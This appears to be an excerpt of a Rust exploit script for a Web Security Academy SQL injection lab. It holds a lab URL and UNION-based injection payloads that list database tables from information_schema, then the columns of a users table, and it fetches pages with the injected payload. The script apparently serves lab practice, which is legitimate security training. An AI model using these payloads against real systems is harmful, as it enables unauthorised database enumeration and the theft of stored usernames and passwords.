...
fn main() {
    ...
    let url = "https://0a7600490398f03080ba304100f20040.web-security-academy.net";
    ...
    let users_table_payload = "' union SELECT table_name, null from information_schema.tables-- -";
    ...
    let username_password_columns_payload = format!("' union SELECT column_name, null from information_schema.columns where table_name = '{}'-- -", users_table);
    // fetch the page with the injected payload
